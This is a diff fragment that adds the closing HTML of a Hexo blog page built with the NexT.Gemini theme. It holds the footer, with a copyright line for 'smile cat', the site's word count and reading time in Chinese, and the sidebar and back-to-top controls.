+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">smile cat</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">36k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">33 分钟</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
